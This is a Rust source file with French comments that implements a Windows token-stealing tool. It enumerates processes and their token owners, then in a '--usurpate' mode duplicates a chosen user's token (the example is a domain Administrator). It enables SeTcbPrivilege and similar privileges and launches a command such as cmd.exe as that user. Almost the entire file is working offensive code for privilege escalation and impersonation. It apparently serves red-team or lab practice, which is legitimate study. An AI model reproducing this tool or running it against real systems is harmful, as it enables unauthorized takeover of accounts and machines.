use std::env;
use windows::Win32::Foundation::{HANDLE, CloseHandle, GetLastError, PSID};
use windows::Win32::Security::{
    GetTokenInformation, TokenUser, TokenType, TokenPrivileges, TOKEN_PRIVILEGES, SE_PRIVILEGE_ENABLED, LookupPrivilegeNameW,
    TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_USER, TOKEN_TYPE, 
    TOKEN_ELEVATION, TokenElevationType, DuplicateTokenEx, TOKEN_ALL_ACCESS,
    SecurityImpersonation, SID_NAME_USE, SetTokenInformation, TOKEN_INFORMATION_CLASS
};
use windows::Win32::System::RemoteDesktop::WTSGetActiveConsoleSessionId;
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcess, OpenProcessToken, CreateProcessWithTokenW, PROCESS_INFORMATION, STARTUPINFOW, WaitForSingleObject, LOGON_WITH_PROFILE, CREATE_NEW_CONSOLE, CREATE_UNICODE_ENVIRONMENT};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS
};
use windows::core::{PCWSTR, PWSTR};
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use std::os::windows::ffi::OsStrExt;
use std::process::Command;

/// Récupère l'utilisateur du token
unsafe fn get_token_user(token_handle: HANDLE) -> String {
    let mut token_info: [u8; 256] = [0; 256];
    let mut return_length = 0;

    if GetTokenInformation(
        token_handle,
        TokenUser,
        Some(token_info.as_mut_ptr() as *mut _),
        token_info.len() as u32,
        &mut return_length,
    ).is_ok() {
        let token_user: *const TOKEN_USER = token_info.as_ptr() as *const TOKEN_USER;
        let sid_ptr: PSID = (*token_user).User.Sid;
        return get_sid_info(sid_ptr);
    }
    "Unknown".to_string()
}

/// Convertit un SID en nom d'utilisateur lisible
unsafe fn get_sid_info(sid_ptr: PSID) -> String {
    let mut name = vec![0u16; 256];
    let mut domain_name = vec![0u16; 256];
    let mut name_size = name.len() as u32;
    let mut domain_size = domain_name.len() as u32;
    let mut sid_type = SID_NAME_USE(0);

    if windows::Win32::Security::LookupAccountSidW(
        None,
        sid_ptr,
        PWSTR(name.as_mut_ptr()),
        &mut name_size,
        PWSTR(domain_name.as_mut_ptr()),
        &mut domain_size,
        &mut sid_type,
    )
    .is_ok() {
        let user = OsString::from_wide(&name[..name_size as usize]).to_string_lossy().into_owned();
        let domain = OsString::from_wide(&domain_name[..domain_size as usize]).to_string_lossy().into_owned();
        return format!("{}\\{}", domain, user);
    }

    "Unknown".to_string()
}


unsafe fn get_token_privileges(token_handle: HANDLE) {
    let mut priv_info: [u8; 512] = [0; 512];
    let mut return_length = 0;

    if GetTokenInformation(
        token_handle,
        TokenPrivileges,
        Some(priv_info.as_mut_ptr() as *mut _),
        priv_info.len() as u32,
        &mut return_length,
    ).is_ok() {
        let token_privs: *const TOKEN_PRIVILEGES = priv_info.as_ptr() as *const TOKEN_PRIVILEGES;
        println!("\n🔹 Privilèges du token :");

        let priv_slice = std::slice::from_raw_parts(
            (*token_privs).Privileges.as_ptr(),
            (*token_privs).PrivilegeCount as usize,
        );

        for priv_entry in priv_slice.iter() {
            let luid = priv_entry.Luid;
            let privilege_name = get_privilege_name(luid);
            let status = if priv_entry.Attributes.0 & SE_PRIVILEGE_ENABLED.0 != 0 {
                "Activé"
            } else {
                "Désactivé"
            };
            println!("   - {} ({})", privilege_name, status);
        }
    } else {
        println!("[X] Impossible de récupérer les privilèges du token.");
    }
}

/// Convertit un LUID en nom de privilège
unsafe fn get_privilege_name(luid: windows::Win32::Foundation::LUID) -> String {
    let mut name_buffer = vec![0u16; 256];
    let mut name_length = name_buffer.len() as u32;

    if LookupPrivilegeNameW(None, &luid, PWSTR(name_buffer.as_mut_ptr()), &mut name_length).is_ok() {
        let name = OsString::from_wide(&name_buffer[..name_length as usize]);
        return name.to_string_lossy().into_owned();
    }
    format!("LUID inconnu ({:?}:{:?})", luid.HighPart, luid.LowPart)
}



fn main() {
    let args: Vec<String> = env::args().collect();

    if args.contains(&"--current-process".to_string()) {
        println!("[?] Affichage du token du processus actuel...");
        unsafe { display_current_process_token(); }
    } else if args.contains(&"--all-processes".to_string()) {
        println!("\n[*] Enumerating tokens...");
        println!("[*] Listing unique users found\n");
        unsafe { enumerate_impersonation_tokens(); }
    } else if args.contains(&"--usurpate".to_string()) {
        if args.len() < 4 {
            eprintln!("[X] Usage : --usurpate \"PWNLAND\\Administrateur\" \"cmd.exe\"");
        } else {
            let target_user = args[2].clone();
            let command = args[3].clone();
            unsafe { usurpate_token(&target_user, &command) };
        }
    } else {
        eprintln!("[X] Usage : --current-process, --all-processes, --usurpate \"TOKEN\" \"cmd.exe\"");
    }
}


/// Afficher le token du processus en cours
unsafe fn display_current_process_token() {
    let mut token_handle: HANDLE = HANDLE::default();

    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle).is_err() {
        eprintln!("Échec de l'ouverture du token : {:?}", GetLastError());
        return;
    }

    let owner = get_token_user(token_handle);
    let token_type = get_token_type(token_handle);
    let elevation = is_token_elevated(token_handle);

    println!("Utilisateur : {}", owner);
    println!("Type de token : {}", token_type);
    println!("Token élevé : {}", if elevation { "Oui" } else { "Non" });
    get_token_privileges(token_handle);
    let _ = CloseHandle(token_handle);
}

/// Enumérer tous les tokens d'impersonation accessibles
unsafe fn enumerate_impersonation_tokens() {
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot.is_err() {
        eprintln!("Erreur lors de la récupération des processus: {:?}", GetLastError());
        return;
    }
    let snapshot = snapshot.unwrap();

    let mut process_entry = PROCESSENTRY32 {
        dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
        ..Default::default()
    };

    let mut delegation_tokens = Vec::new();
    let mut impersonation_tokens = Vec::new();

    if Process32First(snapshot, &mut process_entry).is_err() {
        println!("[X] Impossible d'énumérer les processus !");
        return;
    }

    loop {
        let process_id = process_entry.th32ProcessID;
        let process_name = get_process_name(&process_entry);
        let process_handle = OpenProcess(
            windows::Win32::System::Threading::PROCESS_QUERY_INFORMATION 
            | windows::Win32::System::Threading::PROCESS_DUP_HANDLE 
            | windows::Win32::System::Threading::PROCESS_VM_READ, 
            false, process_id,
        );

        if let Ok(proc_handle) = process_handle {
            let mut token_handle: HANDLE = HANDLE::default();

            if OpenProcessToken(proc_handle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &mut token_handle).is_ok() {
                if let Some(token_type) = get_token_type_enum(token_handle) {
                    let owner = get_token_user(token_handle);
                    let formatted = format!("{:<30} {:<10} {}", process_name, process_id, owner);

                    if token_type == TOKEN_TYPE(2) { // Impersonation token
                        impersonation_tokens.push(formatted);
                    } else if token_type == TOKEN_TYPE(1) { // Delegation token
                        delegation_tokens.push(formatted);
                    }
                }
                let _ = CloseHandle(token_handle);
            }
            let _ = CloseHandle(proc_handle);
        }

        if Process32Next(snapshot, &mut process_entry).is_err() {
            break;
        }
    }

    let _ = CloseHandle(snapshot);

    // Affichage formaté proprement
    println!("============================================================");
    println!("Delegation Tokens Available");
    println!("============================================================");
    println!("{:<30} {:<10} {}", "Process Name", "PID", "Owner");
    println!("------------------------------------------------------------");

    if delegation_tokens.is_empty() {
        println!("[None]");
    } else {
        for token in delegation_tokens.iter() {
            println!("{}", token);
        }
    }

    // println!("\n==========================================================");
    // println!("Impersonation Tokens Available");
    // println!("============================================================");
    // if impersonation_tokens.is_empty() {
    //     println!("[None]");
    // } else {
    //     for token in impersonation_tokens.iter() {
    //         println!("{}", token);
    //     }
    // }
}


/// Usurper un delegation token et exécuter une commande avec les privilèges associés
unsafe fn set_token_session_id(token_handle: HANDLE, session_id: u32) {
    SetTokenInformation(
        token_handle,
        TOKEN_INFORMATION_CLASS(12), 
        &session_id as *const _ as *const _,
        std::mem::size_of::<u32>() as u32,
    ).ok();
}

unsafe fn get_active_session_id() -> u32 {
    WTSGetActiveConsoleSessionId()
}

unsafe fn usurpate_token(target_user: &str, command: &str) {
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snapshot.is_err() {
        eprintln!("Erreur lors de la récupération des processus: {:?}", GetLastError());
        return;
    }
    let snapshot = snapshot.unwrap();

    let mut process_entry = PROCESSENTRY32 {
        dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
        ..Default::default()
    };

    let mut found_token: Option<HANDLE> = None;

    if Process32First(snapshot, &mut process_entry).is_ok() {
        loop {
            let process_id = process_entry.th32ProcessID;
            let process_handle = OpenProcess(
                windows::Win32::System::Threading::PROCESS_QUERY_INFORMATION 
                | windows::Win32::System::Threading::PROCESS_DUP_HANDLE, 
                false, process_id,
            );

            if let Ok(proc_handle) = process_handle {
                let mut token_handle: HANDLE = HANDLE::default();

                if OpenProcessToken(proc_handle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &mut token_handle).is_ok() {
                    let owner = get_token_user(token_handle);
                    let token_type = get_token_type_enum(token_handle);

                    if owner == target_user && token_type == Some(TOKEN_TYPE(1)) {  // Vérifie que c'est un Delegation Token
                        found_token = Some(token_handle);
                        break;
                    }
                }
                let _ = CloseHandle(proc_handle);
            }

            if Process32Next(snapshot, &mut process_entry).is_err() {
                break;
            }
        }
    }

    let _ = CloseHandle(snapshot);

    if let Some(original_token) = found_token {
        println!("[*] Delegation Token trouvé pour : {}", target_user);

        let mut duplicated_token: HANDLE = HANDLE::default();

        if DuplicateTokenEx(
            original_token,
            TOKEN_ALL_ACCESS,
            None,
            SecurityImpersonation,
            TOKEN_TYPE(1),
            &mut duplicated_token,
        )
        .is_ok()
        {
            println!("[+] Token dupliqué avec succès, lancement de la commande : {}", command);

            let mut startup_info: STARTUPINFOW = std::mem::zeroed();
            startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            startup_info.lpDesktop = PWSTR("WinSta0\\Winlogon\0".encode_utf16().collect::<Vec<u16>>().as_ptr() as *mut _);

            let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

            let mut command_wide: Vec<u16> = OsString::from(command)
            .encode_wide()
            .chain(Some(0))
            .collect();

            let session_id = get_active_session_id();
            println!("[*] Assignation du token à la session {}", session_id);

            let mut primary_token: Option<HANDLE> = None;

            if let Some(token) = convert_to_primary_token(duplicated_token) {
                println!("[+] Token converti en Primary Token !");
                let session_id = get_active_session_id();
                set_token_session_id(token, session_id);
                println!("[+] Token assigné à la session active : {}", session_id);
                primary_token = Some(token);
            } else {
                eprintln!("[-] Impossible d'obtenir un Primary Token.");
                return;
            }
            
            println!("[*] Vérification des privilèges du token...");
            if let Some(token) = primary_token {
                get_token_privileges(token);
            } else {
                eprintln!("[-] Erreur : Aucun Primary Token disponible !");
            }
            
            if let Some(token) = primary_token {
                set_token_session_id(token, session_id);
            } else {
                eprintln!("[-] Erreur : Aucun Primary Token disponible !");
            }            

            let new_session_id = get_active_session_id();
            println!("[*] Session après modification : {}", new_session_id);
            
            let mut startup_info: STARTUPINFOW = std::mem::zeroed();
            startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            startup_info.lpDesktop = PWSTR("WinSta0\\Default\0".encode_utf16().collect::<Vec<u16>>().as_ptr() as *mut _);
            
            println!("[*] Vérification de la session après assignation : {}", get_active_session_id());

            
            if let Some(primary_token) = primary_token {
                if CreateProcessWithTokenW(
                    primary_token, 
                    LOGON_WITH_PROFILE, 
                    None, 
                    PWSTR(command_wide.as_mut_ptr()), 
                    CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, 
                    None, 
                    None, 
                    &mut startup_info, 
                    &mut process_info
                ).is_ok()                
                {
                    println!("[+] Processus démarré avec succès !");

                    println!("[*] Vérification avec `tasklist`...");
                    let output = Command::new("tasklist").output().expect("Failed to execute tasklist");
                    let tasklist_output = String::from_utf8_lossy(&output.stdout);
                
                    if tasklist_output.contains("cmd.exe") {
                        println!("[✔] cmd.exe est bien lancé !");
                    } else {
                        eprintln!("[X] cmd.exe n'apparaît PAS dans `tasklist` !");
                    }

                    WaitForSingleObject(process_info.hProcess, 0xFFFFFFFF);
                } else {
                    eprintln!("[-] Échec du démarrage du processus. Code d'erreur : {:?}", GetLastError());
                }
                
                let _ = CloseHandle(primary_token);
            } else {
                eprintln!("[-] Impossible d'obtenir un Primary Token, abandon.");
            }

            let _ = CloseHandle(duplicated_token);
        } else {
            eprintln!("[-] Impossible de dupliquer le token.");
        }

        let _ = CloseHandle(original_token);
    } else {
        eprintln!("[-] Aucun delegation token trouvé pour {}", target_user);
    }
}


/// Récupérer le type de token
unsafe fn get_token_type_enum(token_handle: HANDLE) -> Option<TOKEN_TYPE> {
    let mut token_type: TOKEN_TYPE = TOKEN_TYPE(0);
    let mut return_length = 0;

    if GetTokenInformation(
        token_handle,
        TokenType,
        Some(&mut token_type as *mut _ as *mut _),
        std::mem::size_of::<TOKEN_TYPE>() as u32,
        &mut return_length,
    ).is_ok() {
        return Some(token_type);
    }
    None
}

/// Récupérer le type de token en string
unsafe fn get_token_type(token_handle: HANDLE) -> String {
    match get_token_type_enum(token_handle) {
        Some(TOKEN_TYPE(1)) => "Primary".to_string(),
        Some(TOKEN_TYPE(2)) => "Impersonation".to_string(),
        _ => "Inconnu".to_string(),
    }
}

/// Vérifier si le token est élevé (Admin)
unsafe fn is_token_elevated(token_handle: HANDLE) -> bool {
    let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut return_length = 0;

    GetTokenInformation(
        token_handle,
        TokenElevationType,
        Some(&mut elevation as *mut _ as *mut _),
        std::mem::size_of::<TOKEN_ELEVATION>() as u32,
        &mut return_length,
    ).is_ok() && elevation.TokenIsElevated != 0
}

/// Récupérer le nom du processus
fn get_process_name(process_entry: &PROCESSENTRY32) -> String {
    let name_bytes = &process_entry.szExeFile;
    let name = name_bytes.iter()
        .take_while(|&&c| c != 0)  // Prend les caractères jusqu'au premier NULL
        .map(|&c| c as u8)         // Convertit en `u8`
        .collect::<Vec<u8>>();     // Crée un `Vec<u8>`

    String::from_utf8_lossy(&name).to_string()
}
unsafe fn enable_token_privilege(token_handle: HANDLE, privilege_name: &str) -> bool {
    use windows::Win32::Security::{LookupPrivilegeValueW, AdjustTokenPrivileges, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED};
    use windows::Win32::Foundation::LUID;

    let mut luid = LUID::default();
    
    // Récupérer le LUID du privilège
    if LookupPrivilegeValueW(None, PCWSTR(OsString::from(privilege_name).encode_wide().chain(Some(0)).collect::<Vec<u16>>().as_ptr()), &mut luid).is_err() {
        eprintln!("[-] Impossible de récupérer le LUID du privilège : {}", privilege_name);
        return false;
    }

    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    // Activer le privilège
    if AdjustTokenPrivileges(token_handle, false, Some(&tp), 0, None, None).is_err() {
        eprintln!("[-] Impossible d'activer le privilège : {}", privilege_name);
        return false;
    }

    println!("[+] Privilège activé : {}", privilege_name);
    true
}


unsafe fn convert_to_primary_token(impersonation_token: HANDLE) -> Option<HANDLE> {
    let mut primary_token: HANDLE = HANDLE::default();

    if DuplicateTokenEx(
        impersonation_token,
        TOKEN_ALL_ACCESS,
        None,
        SecurityImpersonation,
        TOKEN_TYPE(1),
        &mut primary_token,
    ).is_ok() {
        println!("[+] Token converti en Primary Token !");
        let usurped_user = get_token_user(primary_token);
        println!("[*] Token usurpé : {}", usurped_user);

        enable_token_privilege(primary_token, "SeAssignPrimaryTokenPrivilege");
        enable_token_privilege(primary_token, "SeIncreaseQuotaPrivilege");
        enable_token_privilege(primary_token, "SeTcbPrivilege");


        Some(primary_token)
    } else {
        eprintln!("[-] Impossible de convertir le token en Primary Token.");
        None
    }
}
